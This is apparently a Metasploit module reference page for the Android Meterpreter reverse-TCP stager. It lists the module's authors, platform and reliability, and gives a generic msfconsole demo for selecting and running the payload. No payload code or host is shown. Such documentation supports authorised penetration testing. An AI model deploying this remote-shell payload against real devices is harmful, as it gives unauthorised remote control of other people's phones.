## Android Meterpreter, Dalvik Reverse TCP Stager

Run a meterpreter server on Android. Connect back stager


## Module Name
payload/android/meterpreter/reverse_tcp

## Authors
* mihi
* egypt
* anwarelmakrahy
* OJ Reeves
* timwr





## Platforms
* android

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/android/meterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    